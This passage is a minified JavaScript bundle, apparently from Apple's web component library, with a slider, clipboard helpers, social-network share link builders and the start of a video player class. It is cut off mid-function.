n=this._keyDown[h(e)]||0;n?Math.abs(this._keyDown[h(e)])<Math.abs(this.model.max*this.model.keyboardMaxStepPercentage)&&(n*=this.model.keyboardStepMultiplier):(this.trigger("grab",this.getValue()),n="auto"!==(n=this.getStep())?n:this._cachedMaxStep,t||(n*=-1),this._keyboard.onceUp(h(e),this._triggerRelease)),this._keyDown[h(e)]=n,this.setValue(this.getValue()+n)},m.stepUp=function(e){this._step(e,!0)},m.stepDown=function(e){this._step(e,!1)},m.setValue=function(e){e=this._getNextValue(e,this.getMin(),this.getMax(),this.getStep()),this._set("value",e),this.el.setAttribute("aria-valuenow",e),this._onChange(e)},m.setMin=function(e){this._set("min",e),this.el.setAttribute("aria-valuemin",e)},m.setMax=function(e){this._set("max",e),this.el.setAttribute("aria-valuemax",e),this._cachedMaxStep=e/100},m.setStep=function(e){this._set("step",e)},m._set=function(e,t){if(p.indexOf(e)>-1&&this.model[e]!==t){var n=this.model[e];this.model[e]=t,this.trigger("change:model:"+e,{previous:n,current:t})}},m._removeEventListeners=function(){this._removeEventListener(this.el,"mousedown",this._onMouseDown),this._removeEventListener(this.el,"touchstart",this._onTouchStart),this._removeEventListener(this.el,"mouseover",this._onMouseOver),this._removeEventListener(this.el,"mouseleave",this._onMouseLeave),this._removeEventListener(this.el,"touchend",this._onTouchEnd),this._removeEventListener(document,"touchend",this._onMouseUp),"horizontal"===this.model.orientation?(this._keyboard.offDown(c.num,this.stepUp),this._keyboard.offDown(a.num,this.stepDown),this._keyboard.offUp(a.num,this._triggerRelease),this._keyboard.offUp(c.num,this._triggerRelease)):(this._keyboard.offDown(l.num,this.stepDown),this._keyboard.offDown(38,this.stepUp),this._keyboard.offUp(l.num,this._triggerRelease),this._keyboard.offUp(38,this._triggerRelease))},m.destroy=function(){this._removeEventListeners(),this._keyboard&&this._keyboard.destroy(),i.prototype.destroy.call(this)},t.exports=f},{"./templates/slider.html":268,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-keyboard/Keyboard":263,"@marcom/dom-metrics":405}],267:[function(e,t,n){"use strict";t.exports.Slider=e("./Slider")},{"./Slider":266}],268:[function(e,t,n){t.exports='<div class="ac-slider-runnable-track">\n\t<div class="ac-slider-thumb"></div>\n</div>'},{}],269:[function(e,t,n){"use strict";t.exports={copy:e("./copyToClipboard")}},{"./copyToClipboard":272}],270:[function(e,t,n){"use strict";var i=e("./select");t.exports=function(e){return i(e),document.execCommand("copy")}},{"./select":273}],271:[function(e,t,n){"use strict";var i=e("./copyElement"),r=document.createElement("input");r.setAttribute("tabindex",-1),r.setAttribute("readonly",!0),r.setAttribute("aria-hidden",!0),r.style.position="fixed",t.exports=function(e){var t=!1;document.body.appendChild(r);try{r.value=e,t=i(r)}catch(e){}return document.body.removeChild(r),t}},{"./copyElement":270}],272:[function(e,t,n){"use strict";var i=e("./copyString"),r=e("./copyElement");t.exports=function(e){return"string"==typeof e?i(e):r(e)}},{"./copyElement":270,"./copyString":271}],273:[function(e,t,n){"use strict";t.exports=function(e){if("function"==typeof e.select)e.select()||e.setSelectionRange(0,e.value.length);else{var t=document.createRange();t.selectNodeContents(e);var n=window.getSelection();n.removeAllRanges(),n.addRange(t)}}},{}],274:[function(e,t,n){"use strict";t.exports={Link:e("./ac-social/Link"),Dialog:e("./ac-social/Dialog"),Focus:e("./ac-social/Focus"),Debug:e("./ac-social/Debug"),ShareFactory:e("./ac-social/ShareFactory"),AutoSocial:e("./ac-social/AutoSocial")}},{"./ac-social/AutoSocial":275,"./ac-social/Debug":276,"./ac-social/Dialog":277,"./ac-social/Focus":278,"./ac-social/Link":279,"./ac-social/ShareFactory":281}],275:[function(e,t,n){"use strict";var i=e("./ShareFactory");t.exports=function(e){i.autoCreate({context:e})}},{"./ShareFactory":281}],276:[function(e,t,n){"use strict";var i=e("./NetworkActions");function r(){var e;for(e in this.types={},i)i.hasOwnProperty(e)&&(o[e]=e,this.addType(e,i[e].getDialogDebugData.bind(i[e])))}var o=r.prototype;o.create=function(e,t){t=t||{};var n=this.types[e];if(n)return n(t)},o.addType=function(e,t){return this.types[e]=t,this},o.removeType=function(){return this.types[name]=null,this},t.exports=new r},{"./NetworkActions":280}],277:[function(e,t,n){"use strict";var i=e("./NetworkActions");function r(){var e;for(e in this.types={},i)i.hasOwnProperty(e)&&(o[e]=e,this.addType(e,i[e].generateDialog.bind(i[e])))}var o=r.prototype;o.create=function(e,t){t=t||{};var n=this.types[e];if(n)return n(t)},o.addType=function(e,t){return this.types[e]=t,this},o.removeType=function(){return this.types[name]=null,this},t.exports=new r},{"./NetworkActions":280}],278:[function(e,t,n){"use strict";t.exports=function(e){if(window.getSelection){var t=window.getSelection();(n=document.createRange()).selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}else if(e.setSelectionRange)e.setSelectionRange(0,e.value.length);else if(document.body.createTextRange){var n;(n=document.body.createTextRange()).moveToElementText(e),n.select()}}},{}],279:[function(e,t,n){"use strict";var i=e("./NetworkActions"),r=e("./network-actions/DefaultNetworkAction");function o(){var e;for(e in this.types={},i)i.hasOwnProperty(e)&&(s[e]=e,this.addType(e,i[e].generateLink.bind(i[e])))}var s=o.prototype;s.create=function(e,t,n){t=t||{};var i=this.types[e];if(i)return i(t,n)},s.createFromAnchor=function(e){var t,n=e.getAttribute("data-network-action");for(t in i)if(i.hasOwnProperty(t)&&n===i[t].id)return void i[t].enhanceLinkEngagement(e);r.enhanceLinkEngagement(e)},s.addType=function(e,t){return this.types[e]=t,this},s.removeType=function(){return this.types[name]=null,this},t.exports=new o},{"./NetworkActions":280,"./network-actions/DefaultNetworkAction":283}],280:[function(e,t,n){"use strict";var i=e("./network-actions/FacebookShare"),r=e("./network-actions/PinterestShare"),o=e("./network-actions/TumblrShare"),s=e("./network-actions/TwitterFavorite"),a=e("./network-actions/TwitterReply"),c=e("./network-actions/TwitterRetweet"),l=e("./network-actions/TwitterTweet"),u=e("./network-actions/WeiboShare"),h=e("./network-actions/QQWeiboShare"),d=e("./network-actions/QZoneShare"),p=e("./network-actions/RenrenShare"),f=e("./network-actions/EMailShare"),m=e("./network-actions/VKShare"),_=e("./network-actions/LineShare"),v=e("./network-actions/WhatsAppShare");t.exports={FACEBOOK_SHARE:i,PINTEREST_SHARE:r,TUMBLR_SHARE:o,TWITTER_FAVORITE:s,TWITTER_REPLY:a,TWITTER_RETWEET:c,TWITTER_TWEET:l,WEIBO_SHARE:u,QQWEIBO_SHARE:h,QZONE_SHARE:d,RENREN_SHARE:p,EMAIL_SHARE:f,VK_SHARE:m,LINE_SHARE:_,WHATSAPP_SHARE:v}},{"./network-actions/EMailShare":284,"./network-actions/FacebookShare":285,"./network-actions/LineShare":286,"./network-actions/PinterestShare":288,"./network-actions/QQWeiboShare":289,"./network-actions/QZoneShare":290,"./network-actions/RenrenShare":291,"./network-actions/TumblrShare":292,"./network-actions/TwitterFavorite":293,"./network-actions/TwitterReply":294,"./network-actions/TwitterRetweet":295,"./network-actions/TwitterTweet":296,"./network-actions/VKShare":297,"./network-actions/WeiboShare":298,"./network-actions/WhatsAppShare":299}],281:[function(e,t,n){"use strict";var i=e("./Dialog"),r=e("./copy-actions/CopyToClipboard"),o={facebook:"FACEBOOK_SHARE",pinterest:"PINTEREST_SHARE",tumblr:"TUMBLR_SHARE",twitter:"TWITTER_TWEET",weibo:"WEIBO_SHARE",qqweibo:"QQWEIBO_SHARE",qzone:"QZONE_SHARE",renren:"RENREN_SHARE",email:"EMAIL_SHARE",vk:"VK_SHARE",line:"LINE_SHARE",whatsapp:"WHATSAPP_SHARE"};function s(){this._buttonEvts=[],this._autoCreatedUrlEls=[]}var a=s.prototype;a.autoCreate=function(e){var t=(e=e||{}).context||document.body,n=Array.prototype.slice.call(t.querySelectorAll("[data-ac-social-url]"));0===this._autoCreatedUrlEls.length?this._autoCreatedUrlEls=Array.prototype.slice.call(n):(n=n.filter(this._hasNotBeenAutoCreated.bind(this)),this._autoCreatedUrlEls=this._autoCreatedUrlEls.concat(n)),n.forEach((function(e){var t=e.querySelectorAll("[data-ac-social-button]"),n=e.getAttribute("data-ac-social-url");if(!n)throw new Error("Please provide a valid URL to share in your data-ac-social-url attribute");t.forEach(function(e){this._createSocialButton(e,n)}.bind(this))}),this)},a._hasNotBeenAutoCreated=function(e){return-1===this._autoCreatedUrlEls.indexOf(e)},a._createSocialButton=function(e,t){var n=e.getAttribute("data-ac-social-button"),s=o[n];if(s){var a=i.create.bind(i,i[s],{url:t});this._buttonEvts.push({button:e,callback:a}),e.addEventListener("click",a)}else"copy"===n&&new r(e,t)},a.destroyButtons=function(){this._buttonEvts.forEach(function(e){e.button.removeEventListener("click",e.callback)}.bind(this)),this._buttonEvts=[]},t.exports=new s},{"./Dialog":277,"./copy-actions/CopyToClipboard":282}],282:[function(e,t,n){"use strict";var i=e("@marcom/ac-clipboard"),r="show-notification";function o(e,t){this.el=e,this.el.addEventListener("click",function(){i.copy(t),this._notifyTextCopied()}.bind(this))}o.prototype._notifyTextCopied=function(){var e=this.el.parentNode.querySelector("[data-ac-social-notification]");try{e.classList.add(r),setTimeout((function(){e.classList.remove(r)}),1e3)}catch(e){throw new Error("Please provide a notification message element for the copy to clipboard functionality")}},t.exports=o},{"@marcom/ac-clipboard":269}],283:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return e}),{baseLinkPath:""})},{"./NetworkAction":287}],284:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){var t={url:e.url};return e.title&&(t.subject=e.title),e.description?t.body=e.description+"\r\n\r\n"+e.url:t.body=e.url,t}),{id:"email-share",baseLinkPath:"mailto:",preventDialog:!0})},{"./NetworkAction":287}],285:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{u:e.url}}),{id:"facebook-share",baseLinkPath:"https://www.facebook.com/sharer/sharer.php",dialogDimensions:{width:555,height:368}})},{"./NetworkAction":287}],286:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,text:e.description,from:"line_scheme"}}),{id:"line-share",baseLinkPath:"https://social-plugins.line.me/lineit/share",dialogDimensions:{width:555,height:505}})},{"./NetworkAction":287}],287:[function(e,t,n){"use strict";var i,r=function(e,t){t=t||{},this.baseLinkPath=t.baseLinkPath,t.dialogDimensions&&(this.dialogDimensions=t.dialogDimensions),t.id&&(this.id=t.id),t.preventDialog&&(this.preventDialog=t.preventDialog),this.normalizeData=e};(i=r.prototype).dataAttributeName="network-action",i.id="network-action",i.normalizeData=function(e){return e},i.dialogDimensions={width:500,height:500},i.generateLinkURL=function(e){const t=this.normalizeData(e),n=JSON.parse(JSON.stringify(t)),i=new URLSearchParams(n).toString();let r=this.baseLinkPath;return i.length>0&&(r=r+"?"+i),r},i.generateLink=function(e,t){var n=this.generateLinkURL(e);return(t=t||document.createElement("A")).setAttribute("href",n),t.setAttribute("target","_blank"),t.setAttribute("data-"+this.dataAttributeName,this.id),this.enhanceLinkEngagement(t,n),t},i.generateDialog=function(e){var t=this.generateLinkURL(e);this._triggerDialog(t)},i.enhanceLinkEngagement=function(e,t){t=t||e.getAttribute("href"),e.addEventListener("click",this._onLinkEngaged.bind(this,t))},i.getDialogOptions=function(){var e,t="status=1",n={width:this.dialogDimensions.width,height:this.dialogDimensions.height};for(e in n.top=(window.screen.availHeight-n.height)/2,n.left=(window.screen.availWidth-n.width)/2,n)n.hasOwnProperty(e)&&(t+=", "+e+"="+n[e]);return t},i.getDialogDebugData=function(e){return{data:this.normalizeData(e),dialogUrl:this.generateLinkURL(e)}},i._triggerDialog=function(e){this.preventDialog?window.location.href=e:window.open(e,"_blank",this.getDialogOptions())},i._onLinkEngaged=function(e,t){t.preventDefault(),this._triggerDialog(e)},t.exports=r},{}],288:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){var t={url:e.url,description:e.description};return e.media&&(t.media=e.media),t}),{id:"pinterest-share",baseLinkPath:"http://www.pinterest.com/pin/create/button",dialogDimensions:{width:750,height:450}})},{"./NetworkAction":287}],289:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,title:e.title,pic:e.media}}),{id:"qq-weibo-share",baseLinkPath:"http://v.t.qq.com/share/share.php",dialogDimensions:{width:658,height:506}})},{"./NetworkAction":287}],290:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,title:e.title,pics:e.media,summary:e.description}}),{id:"qzone-share",baseLinkPath:"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey",dialogDimensions:{width:620,height:645}})},{"./NetworkAction":287}],291:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,title:e.title}}),{id:"renren-share",baseLinkPath:"http://www.connect.renren.com/share/sharer",dialogDimensions:{width:500,height:315}})},{"./NetworkAction":287}],292:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){var t={clickthru:e.url,caption:e.description};return e.media&&(t.source=e.media),t}),{id:"tumblr-share",baseLinkPath:"http://www.tumblr.com/share/photo",dialogDimensions:{width:450,height:432}})},{"./NetworkAction":287}],293:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{tweet_id:e.messageId}}),{id:"twitter-favorite",baseLinkPath:"https://twitter.com/intent/favorite",dialogDimensions:{width:550,height:420}})},{"./NetworkAction":287}],294:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){var t={in_reply_to:e.messageId};return e.hashtags&&(t.hashtags=e.hashtags),t}),{id:"twitter-reply",baseLinkPath:"https://twitter.com/intent/tweet",dialogDimensions:{width:550,height:420}})},{"./NetworkAction":287}],295:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{tweet_id:e.messageId}}),{id:"twitter-retweet",baseLinkPath:"https://twitter.com/intent/retweet",dialogDimensions:{width:550,height:420}})},{"./NetworkAction":287}],296:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){var t={url:e.url,text:e.description};return e.hashtags&&(t.hashtags=e.hashtags),t}),{id:"twitter-tweet",baseLinkPath:"https://twitter.com/intent/tweet",dialogDimensions:{width:550,height:420}})},{"./NetworkAction":287}],297:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,title:e.title,image:e.media}}),{id:"vk-share",baseLinkPath:"http://vk.com/share.php",dialogDimensions:{width:555,height:368}})},{"./NetworkAction":287}],298:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{url:e.url,title:e.title,pic:e.media}}),{id:"weibo-share",baseLinkPath:"http://service.weibo.com/share/share.php",dialogDimensions:{width:650,height:426}})},{"./NetworkAction":287}],299:[function(e,t,n){"use strict";var i=e("./NetworkAction");t.exports=new i((function(e){return{text:e.title+" "+e.url}}),{id:"whatsapp-share",baseLinkPath:"https://api.whatsapp.com/send",dialogDimensions:{width:555,height:505}})},{"./NetworkAction":287}],300:[function(e,t,n){"use strict";t.exports=function(e,t,n){return t?(n=n||/{([^{}]*)}/g,e.replace(n,(function(e,n){var i=t[n];return"string"==typeof i||"number"==typeof i||"boolean"==typeof i?i:e}))):e}},{}],301:[function(e,t,n){"use strict";t.exports=function(e,t){var n="";if(e){var i=Object.keys(e),r=i.length-1;i.forEach((function(t,i){var o=e[t],s=(t=t.trim())+(o=null===(o=o&&"string"==typeof o?o.trim():o)?"":"="+o)+(i===r?"":"&");n=n?n.concat(s):s}))}return n&&!1!==t?"?"+n:n}},{}],302:[function(e,t,n){"use strict";t.exports={major:4,minor:6,patch:3,prerelease:null,toString:function(){return"4.6.3 (1ea4c10)"},toArray:function(){return[4,6,3]}}},{}],303:[function(e,t,n){arguments[4][263][0].apply(n,arguments)},{"./internal/KeyEvent":304,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-events/utils/removeEventListener":84,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-object/create":185,dup:263}],304:[function(e,t,n){arguments[4][264][0].apply(n,arguments)},{"./keyCodeMap.js":305,dup:264}],305:[function(e,t,n){arguments[4][265][0].apply(n,arguments)},{dup:265}],306:[function(e,t,n){"use strict";t.exports={BACKSPACE:8,TAB:9,ENTER:13,SHIFT:16,CONTROL:17,ALT:18,COMMAND:91,CAPSLOCK:20,ESCAPE:27,PAGE_UP:33,PAGE_DOWN:34,END:35,HOME:36,ARROW_LEFT:37,ARROW_UP:38,ARROW_RIGHT:39,ARROW_DOWN:40,DELETE:46,ZERO:48,ONE:49,TWO:50,THREE:51,FOUR:52,FIVE:53,SIX:54,SEVEN:55,EIGHT:56,NINE:57,A:65,B:66,C:67,D:68,E:69,F:70,G:71,H:72,I:73,J:74,K:75,L:76,M:77,N:78,O:79,P:80,Q:81,R:82,S:83,T:84,U:85,V:86,W:87,X:88,Y:89,Z:90,NUMPAD_ZERO:96,NUMPAD_ONE:97,NUMPAD_TWO:98,NUMPAD_THREE:99,NUMPAD_FOUR:100,NUMPAD_FIVE:101,NUMPAD_SIX:102,NUMPAD_SEVEN:103,NUMPAD_EIGHT:104,NUMPAD_NINE:105,NUMPAD_ASTERISK:106,NUMPAD_PLUS:107,NUMPAD_DASH:109,NUMPAD_DOT:110,NUMPAD_SLASH:111,NUMPAD_EQUALS:187,TICK:192,LEFT_BRACKET:219,RIGHT_BRACKET:221,BACKSLASH:220,SEMICOLON:186,APOSTRAPHE:222,APOSTROPHE:222,SPACEBAR:32,CLEAR:12,COMMA:188,DOT:190,SLASH:191}},{}],307:[function(e,t,n){"use strict";t.exports=function(e,t){var n=null,i=function(){null===n&&(e.apply(this,arguments),n=setTimeout((function(){n=null}),t))};return i.cancel=function(){clearTimeout(n)},i}},{}],308:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this));return n._chapters=Array.from(e.chapters||[]),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"addChapter",value:function(e){this._chapters.push(e),this._onChange()}},{key:"removeChapter",value:function(e){for(var t=-1,n=0;n<this._chapters.length;n++)if(this._chapters[n].chapter===e){t=n;break}t>=0&&this._chapters.splice(t,1),this._onChange()}},{key:"_onChange",value:function(){this.trigger("change")}},{key:"getChapterForTime",value:function(e){for(var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,n=0;n<this._chapters.length;n++){var i=this._chapters[n],r=i["start-time"];if(!i.duration||isNaN(i.duration)){if(this._chapters.length>n+1){var o=this._chapters[n+1];if(e>=r-t&&e<o["start-time"]-t)return i}else if(e>=r)return i}else if(r-t<=e&&e<r+i.duration-t)return i}return null}},{key:"clearChapters",value:function(){this._chapters=[],this._onChange()}},{key:"chapters",set:function(e){this._chapters=e,this._onChange()},get:function(){return this._chapters}}]),t}(e("@marcom/ac-event-emitter-micro").EventEmitterMicro);t.exports=r},{"@marcom/ac-event-emitter-micro":122}],309:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._listeners={},this.el=t}return i(e,[{key:"on",value:function(e,t){this._listeners[e]||(this._listeners[e]=[]);var n={originalCb:t,args:[e,function(e){t(e)}].concat(Array.from(arguments).slice(2))};this._listeners[e].push(n),this.el.addEventListener.apply(this.el,n.args)}},{key:"off",value:function(e,t){var n=this._listeners[e]||[],i=-1;if(n.find((function(e){return i++,e.originalCb===t}))){var r=n[i];this.el.removeEventListener.apply(this.el,r.args),n.splice(i,1)}}},{key:"replaceElement",value:function(e){var t=this;Object.keys(this._listeners).forEach((function(n){t._listeners[n].forEach((function(n){t.el.removeEventListener.apply(t.el,n.args),e.addEventListener.apply(e,n.args)}))})),this.el=e}},{key:"once",value:function(e,t){var n=this;this.on(e,(function i(){t(),n.off(e,i)}))}},{key:"trigger",value:function(e,t){var n=new CustomEvent(e,{detail:t});this.el.dispatchEvent(n)}}]),e}();t.exports=r},{}],310:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"once",value:function(e,n,i){if(i){var o=function(){n.apply(i,arguments)};r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"once",this).apply(this,[e,o])}else r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"once",this).apply(this,arguments)}},{key:"on",value:function(e,n,i){if(arguments.length>2){this._boundListeners||(this._boundListeners={}),this._boundListeners[e]||(this._boundListeners[e]=[]);var o=n.bind(i);return this._boundListeners[e].push([n,i,o]),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"on",this).call(this,e,o)}return r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"on",this).apply(this,arguments)}},{key:"off",value:function(e,n,i){if(arguments.length>2)try{for(var o=this._boundListeners[e],s=o.length,a=0;a<s;a++)if(o[a][0]===n&&o[a][1]===i){var c=o.splice(a,1)[0];return r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"off",this).call(this,e,c[2])}}catch(e){}return r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"off",this).apply(this,arguments)}},{key:"destroy",value:function(){this._boundListeners=void 0,r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("@marcom/ac-event-emitter-micro").EventEmitterMicro);t.exports=o},{"@marcom/ac-event-emitter-micro":122}],311:[function(e,t,n){"use strict";t.exports=e("./utils/urlOptimizer/OptimizeVideoUrl")},{"./utils/urlOptimizer/OptimizeVideoUrl":398}],312:[function(e,t,n){"use strict";var i="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},r=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),o=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},s=e("../ui/localization/LanguageMapping"),a=e("../event-emitter-shim/EventEmitterShim"),c=e("../dom-emitter/DOMEmitterMicro"),l=e("../chapters/ChapterEmitter"),u=e("../utils/Storage"),h=e("../video/VideoFactory").create,d=e("@marcom/useragent-detect"),p=e("@marcom/ac-fullscreen"),f=e("../posterframe/PosterFrameFactory"),m=e("../ui/localization/Localization"),_=e("../ui/error/ErrorView"),v=e("@marcom/ac-raf-emitter/update"),g=e("@marcom/ac-raf-emitter/cancelUpdate"),y=e("@marcom/ac-feature/isRetina")(),b=e("@marcom/ac-feature/isDesktop")()&&!e("@marcom/ac-feature/touchAvailable")(),w=e("@marcom/ac-feature/isHandheld")(),E=d.browser.safari&&d.os.ios,k=d.browser.safari&&d.os.osx,x=d.browser.chrome,S=d.browser.edge,T="user-hover",C="mouse-leave",O="initial-play",A="ac-video-live",L="ac-video-live-dvr",P=e("../ui/DefaultBreakpoints"),D=e("@marcom/ac-console/log"),F=e("./event/EventsToForward"),M=e("./event/ReadyStateChangeEvents"),I=e("../utils/BreakpointDetect"),R=e("../ui/keyboard-control/createKeyboardControl"),N=e("../ui/controls-interaction/createControlsInteraction"),j=e("@marcom/ac-accessibility/helpers/hide"),B=e("@marcom/ac-accessibility/helpers/show"),U=e("../utils/getVersion");D("@marcom/ac-video version: "+U.toString());var V=function(t){function n(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,n);var t=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(n.__proto__||Object.getPrototypeOf(n)).call(this,e));e=e||{},t.el=e.el||document.createElement("div"),t._elementEmitter=new c(t.el),t.VERSION=U,t.options=e,t._controlsFactory=e.controlsFactory,t._urlOptimizer=e.urlOptimizer,k&&t.el.classList.add("safari-fix-zindex");try{var i=window.top;t._maxWidth=e.maxWidth||Math.min(window.innerWidth,1280)||Math.min(i.innerWidth,1280)}catch(n){t._maxWidth=e.maxWidth||Math.min(window.innerWidth,1280)}return t._lastResize=0,t._lastMouseCoords={},t.el.classList.add("ac-video-player"),t.el.classList.add("idle-state"),t._isLive=e.live,t._isDvr=e.dvr,t._isLive&&t._useLiveMode(e.dvr),t._videoImpl=h(e,t.el),t._isResponsive=e.responsive,t._isResponsive&&(t._breakpointDetect=new I({el:t.el,player:t,breakpoints:P,addClass:!0})),t._supportsInlineVideo=b||!(w&&E),t._cachedPiPMode=t.isPictureInPicture(),t._cachedReadyState=t.getReadyState(),t._cachedVisibleTracksLength=0,t.el.appendChild(t._videoImpl.getRenderElement()),(e.poster||void 0===e.poster)&&(t._initPoster(e.poster),e.autoplay||void 0===e.preload||"none"!==e.preload&&"metadata"!==e.preload&&!1!==e.preload||t._poster.show()),t._bindMethods(),t._addEventListeners(),b&&(t._keyboardControl=R({player:t,threesixty:e.threesixty,keyboardTarget:e.keyboardTarget})),e.controls&&t._initUIComponents(),t._initErrorView(),e.parentElement&&e.parentElement.appendChild(t.el),t._chapterEmitter=new l(e),t.refreshSize=t.refreshSize.bind(t),t._setPersistedUserSettings(),t._refreshSizeTimeout=setTimeout(t.refreshSize,0),window.addEventListener("DOMContentLoaded",t.refreshSize),t}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(n,t),r(n,[{key:"_bindMethods",value:function(){this._onStart=this._onStart.bind(this),this._onEnded=this._onEnded.bind(this),this._onTimeUpdate=this._onTimeUpdate.bind(this),this._onCaptionsChanged=this._onCaptionsChanged.bind(this),this._onPlay=this._onPlay.bind(this),this._onFullscreenChange=this._onFullscreenChange.bind(this),this._onError=this._onError.bind(this),this._forwardEvent=this._forwardEvent.bind(this),this._onPresentationModeChanged=this._onPresentationModeChanged.bind(this),this._forwardFullScreenChangeEvent=this._forwardNamedEvent.bind(this,"fullscreen:change"),this._forwardEnterFullScreenEvent=this._forwardNamedEvent.bind(this,"enterfullscreen"),this._forwardExitFullScreenEvent=this._forwardNamedEvent.bind(this,"exitfullscreen"),this._onDurationChange=this._onDurationChange.bind(this),this._forwardReadyStateChange=this._forwardReadyStateChange.bind(this),this._showControls=this._showControls.bind(this),this._hideControls=this._hideControls.bind(this),this._raiseControls=this._raiseControls.bind(this),this._lowerControls=this._lowerControls.bind(this),this._onPlayPromiseError=this._onPlayPromiseError.bind(this),this._onPlayPromiseResolved=this._onPlayPromiseResolved.bind(this),this._onChapterChange=this._onChapterChange.bind(this),this._onAudioTrackChange=this._onAudioTrackChange.bind(this),this._onVolumeChange=this._onVolumeChange.bind(this),this.refreshSize=this.refreshSize.bind(this)}},{key:"_addEventListeners",value:function(){for(var 